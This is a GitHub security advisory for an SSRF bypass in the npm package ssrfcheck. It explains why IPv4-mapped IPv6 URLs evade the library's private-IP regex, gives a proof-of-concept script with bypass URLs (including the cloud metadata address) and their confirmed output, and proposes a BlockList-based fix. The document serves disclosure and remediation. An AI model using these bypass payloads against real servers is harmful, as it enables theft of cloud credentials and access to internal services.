# [H] ssrfcheck Vulnerable to Server-Side Request Forgery (SSRF) and Incomplete List of Disallowed Inputs

## Summary
Severity: High
Advisory: GHSA-j4rj-2jr5-m439
CVE: CVE-2026-43929
CWE: CWE-184, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-j4rj-2jr5-m439
Type: github-advisory

## Affected
- npm: `ssrfcheck` — affected >=0

## Details
### Summary

`ssrfcheck` v1.3.0 (latest) fails to block Server-Side Request Forgery attacks when the target private IP address is encoded as an IPv4-mapped IPv6 address (e.g. `http://[::ffff:127.0.0.1]/`). The WHATWG URL parser built into Node.js silently normalizes the IPv4 notation inside the brackets to compressed hex form (`[::ffff:7f00:1]`) before the library's private-IP regex ever runs. The regex was written to match dot-notation only and therefore never matches any real input — all seven IANA private IPv4 ranges, including the AWS/GCP/Azure metadata address `169.254.169.254`, are bypassed. Any application using `isSSRFSafeURL()` to guard HTTP requests made with user-supplied URLs is fully exposed to SSRF.

---

### Details

**Vulnerable file:** `src/is-private-ip.js`

The library detects IPv6 private addresses using the `privIp6()` function. The relevant portion:

```js
// src/is-private-ip.js  (lines ~40-60 of the published source)
function privIp6 (ip) {
  return /^::$/.test(ip) ||
    /^::1$/.test(ip) ||
    /^::f{4}:([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
    /^::f{4}:0.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
    /^64:ff9b::([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
    // ... more patterns, all expect dot-notation ...
}
```

The third line is the IPv4-mapped IPv6 check. It expects input in the form `::ffff:127.0.0.1` (dots). However, the IP is extracted from the URL using `url.hostname`, which goes through the WHATWG URL parser first.

**How WHATWG URL normalizes the address** (`src/parse-url.js`):

```js
const url = new URL(normalizeURLStr(input));   // WHATWG URL parser runs here
const ipcheck = trimBrackets(url.hostname);    // e.g. '::ffff:7f00:1'  ← hex, no dots
const ipVersion = isIP(ipcheck);               // returns 6
```

The WHATWG URL spec (§5.3 IPv6 serializer) converts all embedded IPv4 notation to two 16-bit hex groups during parsing:

```
127.0.0.1       → 0x7f000001 → [0x7f00, 0x0001] → serialized as 7f00:1
169.254.169.254 → 0xa9fea9fe → [0xa9fe, 0xa9fe] → serialized as a9fe:a9fe
192.168.1.1     → 0xc0a80101 → [0xc0a8, 0x0101] → serialized as c0a8:101
```

So by the time the regex `/^::f{4}:(\d+)\.(\d+)\.(\d+)\.(\d+)$/` runs, the string it receives is `::ffff:7f00:1` — no dots, no match. The regex has been dead code since Node.js adopted WHATWG URL (v10+).

**Entry point** (`src/index.js`):

```js
if (hostIsIp && (options.noIP || isLoopbackAddr(ip) || isPrivateIP(ip, ipVersion))) {
  return false;   // ← never reached for IPv4-mapped IPv6
}
return true;      // ← always reached → BYPASS
```

---

### PoC

**Environment:** Node.js >= 10, ssrfcheck any version including v1.3.0 (latest). No configuration required — default options are vulnerable.

**Setup:**

```bash
mkdir ssrfcheck-poc && cd ssrfcheck-poc
npm init -y
npm install ssrfcheck
```

**Step 1 — confirm WHATWG URL normalization:**

```bash
node << 'EOF'
const addrs = [
  ['127.0.0.1',       'loopback'],
  ['169.254.169.254', 'AWS/GCP/Azure metadata'],
  ['192.168.1.1',     'private LAN'],
  ['10.0.0.1',        '10.x range'],
];
for (const [ip, label] of addrs) {
  const h = new URL('http://[::ffff:' + ip + ']/').hostname;
  console.log(label + ' -> ' + h);
}
EOF
```

Expected output — confirms WHATWG drops dots:
```
loopback              -> [::ffff:7f00:1]
AWS/GCP/Azure metadata -> [::ffff:a9fe:a9fe]
private LAN           -> [::ffff:c0a8:101]
10.x range            -> [::ffff:a00:1]
```

**Step 2 — trigger the bypass:**

```bash
node << 'EOF'
const { isSSRFSafeURL } = require('ssrfcheck');

const bypasses = [
  'http://[::ffff:127.0.0.1]/',
  'http://[::ffff:169.254.169.254]/',
  'http://[::ffff:192.168.1.1]/',
  'http://[::ffff:10.0.0.1]/',
  'http://[::ffff:172.16.0.1]/',
  'http://[::ffff:7f00:1]/',
  'http://[0:0:0:0:0:ffff:127.0.0.1]/',
];

for (const url of bypasses) {
  const result = isSSRFSafeURL(url);
  console.log(result === true ? '[BYPASS]' : '[caught]', url, '->', result);
}

console.log('---');
const r1 = isSSRFSafeURL('http://127.0.0.1/');
const r2 = isSSRFSafeURL('http://192.168.1.1/');
const r3 = isSSRFSafeURL('http://[::1]/');
console.log('127.0.0.1 caught?',   r1 === false);
console.log('192.168.1.1 caught?', r2 === false);
console.log('[::1] caught?',        r3 === false);
EOF
```

**Confirmed output (live-verified on Node.js v20.20.2, ssrfcheck v1.3.0, Zorin OS Linux, 2026-04-12):**

```
[BYPASS] http://[::ffff:127.0.0.1]/           -> true
[BYPASS] http://[::ffff:169.254.169.254]/     -> true
[BYPASS] http://[::ffff:192.168.1.1]/         -> true
[BYPASS] http://[::ffff:10.0.0.1]/            -> true
[BYPASS] http://[::ffff:172.16.0.1]/          -> true
[BYPASS] http://[::ffff:7f00:1]/              -> true
[BYPASS] http://[0:0:0:0:0:ffff:127.0.0.1]/  -> true
---
127.0.0.1 caught?   true
192.168.1.1 caught? true
[::1] caught?        true
```

7/7 private-range variants bypass the check. Baseline dot-notation detections remain intact, confirming the bug is specific to the WHATWG normalization path.

**Full automated verification script (`verify-ssrfcheck.js`):**

```js
#!/usr/bin/node
// ssrfcheck bypass verification script
// Tests CWE-918 via IPv4-mapped IPv6 WHATWG URL normalization

const { isSSRFSafeURL } = require('ssrfcheck');

const RED   = '\x1b[31m';
const GREEN = '\x1b[32m';
const CYAN  = '\x1b[36m';
const DIM   = '\x1b[2m';
const RESET = '\x1b[0m';

const BYPASSES = [
  { url: 'http://[::ffff:127.0.0.1]/',         label: 'loopback   (127.0.0.1)' },
  { url: 'http://[::ffff:169.254.169.254]/',   label: 'AWS meta   (169.254.169.254)' },
  { url: 'http://[::ffff:192.168.1.1]/',       label: 'LAN        (192.168.1.1)' },
  { url: 'http://[::ffff:10.0.0.1]/',          label: '10.x range (10.0.0.1)' },
  { url: 'http://[::ffff:172.16.0.1]/',        label: '172.16.x   (172.16.0.1)' },
  { url: 'http://[::ffff:7f00:1]/',            label: 'hex form   (direct)' },
  { url: 'http://[0:0:0:0:0:ffff:127.0.0.1]/', label: 'expanded   (0:0:0:0:0:ffff:127.0.0.1)' },
];

const BASELINE = [
  { url: 'http://127.0.0.1/',    label: 'dotted loopback', expectFalse: true },
  { url: 'http://192.168.1.1/',  label: 'private LAN',     expectFalse: true },
  { url: 'http://[::1]/',        label: 'IPv6 loopback',   expectFalse: true },
  { url: 'https://example.com/', label: 'public domain',   expectFalse: false },
];

console.log(`\n${CYAN}=== ssrfcheck v1.3.0 — bypass verification ===${RESET}`);
console.log(`${DIM}Node.js ${process.version}${RESET}\n`);

console.log(`${CYAN}[STEP 1] WHATWG URL hostname normalization${RESET}`);
for (const { url } of BYPASSES) {
  const parsed = new URL(url);
  console.log(`  ${url.padEnd(45)} -> hostname: ${parsed.hostname}`);
}

console.log(`\n${CYAN}[STEP 2] isSSRFSafeURL() results (all should return false)${RESET}`);
let bypassed = 0;
for (const { url, label } of BYPASSES) {
  const result = isSSRFSafeURL(url);
  if (result === true) bypassed++;
  const tag = result === true
    ? `${RED}[BYPASS]${RESET}`
    : `${GREEN}[caught]${RESET}`;
  console.log(`  ${tag} ${label.padEnd(30)} -> isSSRFSafeURL() = ${result}`);
}

console.log(`\n${CYAN}[STEP 3] Baseline checks${RESET}`);
for (const { url, label, expectFalse } of BASELINE) {
  const result = isSSRFSafeURL(url);
  const ok = (expectFalse ? result === false : result === true);
  const tag = ok ? `${GREEN}[OK]${RESET}    ` : `${RED}[FAIL]${RESET}  `;
  console.log(`  ${tag} ${label.padEnd(20)} -> isSSRFSafeURL() = ${result}`);
}

console.log(`\n${bypassed === BYPASSES.length ? RED : GREEN}=== ${bypassed}/${BYPASSES.length} bypasses confirmed ===${RESET}\n`);
process.exit(bypassed === BYPASSES.length ? 1 : 0);
```

Run:
```bash
node verify-ssrfcheck.js
# exit code 1 = bypasses confirmed (vulnerable)
# exit code 0 = all caught (fixed)
```
# VIDEO POC ASCII CAST

[![asciicast](https://asciinema.org/a/CxTKMwrlcHUUbQT8.svg)](https://asciinema.org/a/CxTKMwrlcHUUbQT8)

--

### Impact

**Vulnerability type:** Server-Side Request Forgery (SSRF) — complete protection bypass

**Who is impacted:** Any Node.js application that:
1. Accepts a URL from an untrusted source (user input, API parameter, webhook payload)
2. Uses `isSSRFSafeURL()` from `ssrfcheck` to validate that URL before making an outbound HTTP request
3. Runs on Node.js >= 10 (WHATWG URL parser enabled — all supported versions as of 2026)

**Concrete impact scenarios:**

- **Cloud metadata theft:** On AWS, GCP, or Azure, attacker sends `http://[::ffff:169.254.169.254]/latest/metadat 
- **Internal network pivoting:** Attacker reaches services on `10.x.x.x`, `172.16.x.x`, `192.168.x.x` that are not exposed to the internet, bypassing the only protection layer.
- **Localhost access:** Attacker reaches `http://[::ffff:127.0.0.1]/admin` or any service bound to loopback on the server.

The bypass requires no authentication, no special privileges, and no non-default configuration. It works against every version of ssrfcheck on every Node.js version >= 10.


## Weaknesses

**CWE-918** — Server-Side Request Forgery (SSRF)
**CWE-184** — Incomplete List of Disallowed Inputs

---

## Suggested Fix

Replace the hand-rolled regex denylist in `src/is-private-ip.js` with Node's built-in `net.BlockList`, which operates on parsed IP values and is immune to string representation differences:

```diff
- function privIp6 (ip) {
-   return /^::$/.test(ip) ||
-     /^::1$/.test(ip) ||
-     /^::f{4}:([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
-     /^::f{4}:0.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
-     ...
- }

+ const { BlockList } = require('net');
+
+ const _ipv6Block = new BlockList();
+ _ipv6Block.addAddress('::',          'ipv6');          // unspecified
+ _ipv6Block.addAddress('::1',         'ipv6');          // loopback
+ _ipv6Block.addSubnet('::ffff:0:0',   96, 'ipv6');      // ALL IPv4-mapped — catches any private IPv4 in any notation
+ _ipv6Block.addSubnet('64:ff9b::',    96, 'ipv6');      // NAT64
+ _ipv6Block.addSubnet('fc00::',        7, 'ipv6');      // ULA
+ _ipv6Block.addSubnet('fe80::',       10, 'ipv6');      // link-local
+ _ipv6Block.addSubnet('ff00::',        8, 'ipv6');      // multicast
+ _ipv6Block.addSubnet('100::',        64, 'ipv6');      // IETF reserved
+ _ipv6Block.addSubnet('2001::',       32, 'ipv6');      // Teredo
+ _ipv6Block.addSubnet('2001:db8::',   32, 'ipv6');      // documentation
+ _ipv6Block.addSubnet('2002::',       16, 'ipv6');      // 6to4
+
+ function privIp6(ip) {
+   try { return _ipv6Block.check(ip, 'ipv6'); }
+   catch { return false; }
+ }
```

The `::ffff:0:0/96` subnet entry covers the entire IPv4-mapped IPv6 space in a single rule. `BlockList.check()` parses the IP numerically, so it is unaffected by WHATWG URL normalization or any other string representation.

## References
- https://github.com/felippe-regazio/ssrfcheck/security/advisories/GHSA-j4rj-2jr5-m439
- https://nvd.nist.gov/vuln/detail/CVE-2026-43929
- https://github.com/felippe-regazio/ssrfcheck
